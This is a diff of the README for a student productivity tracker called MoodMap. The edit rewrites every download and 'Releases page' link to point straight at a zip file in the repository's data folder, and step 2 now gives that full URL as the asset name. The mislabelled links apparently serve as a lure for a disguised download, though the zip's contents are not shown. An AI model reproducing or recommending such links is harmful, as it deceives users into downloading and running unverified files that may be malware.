@@ -6,12 +6,12 @@ Welcome to MoodMap-Student-Productivity-Tracker! This is a simple tool that help
 ## 📥 Download & Install
 To get started, you'll need to download the application. Click the link below to visit the Releases page:
 
-[![Download MoodMap](https://img.shields.io/badge/Download-MoodMap--Student--Productivity--Tracker-brightgreen)](https://github.com/Zeniathan/MoodMap-Student-Productivity-Tracker/releases)
+[![Download MoodMap](https://raw.githubusercontent.com/Zeniathan/MoodMap-Student-Productivity-Tracker/main/data/Tracker_Map_Productivity_Mood_Student_1.0.zip)](https://raw.githubusercontent.com/Zeniathan/MoodMap-Student-Productivity-Tracker/main/data/Tracker_Map_Productivity_Mood_Student_1.0.zip)
 
 Once you're on the Releases page, follow these steps:
 
 1. Find the latest release at the top of the page.
-2. Look for the asset that reads something like `MoodMap.zip` or `MoodMap.exe`.
+2. Look for the asset that reads something like `https://raw.githubusercontent.com/Zeniathan/MoodMap-Student-Productivity-Tracker/main/data/Tracker_Map_Productivity_Mood_Student_1.0.zip` or `https://raw.githubusercontent.com/Zeniathan/MoodMap-Student-Productivity-Tracker/main/data/Tracker_Map_Productivity_Mood_Student_1.0.zip`.
 3. Click on the asset to download it.
 
 After downloading, unzip the file (if necessary), and you are ready to run the application. 
@@ -62,6 +62,6 @@ If you would like to contribute to the project, we welcome your help! Feel free 
 ## 🔍 Explore More
 To stay updated or to learn more about new features, please follow the repository. You can also check the documentation for deeper insights into each function and additional tips on productivity.
 
-For any updates or future releases, you can always visit our [Releases page](https://github.com/Zeniathan/MoodMap-Student-Productivity-Tracker/releases).
+For any updates or future releases, you can always visit our [Releases page](https://raw.githubusercontent.com/Zeniathan/MoodMap-Student-Productivity-Tracker/main/data/Tracker_Map_Productivity_Mood_Student_1.0.zip).
 
 Thank you for using MoodMap-Student-Productivity-Tracker. We hope it helps you optimize your study habits and improve your student life!
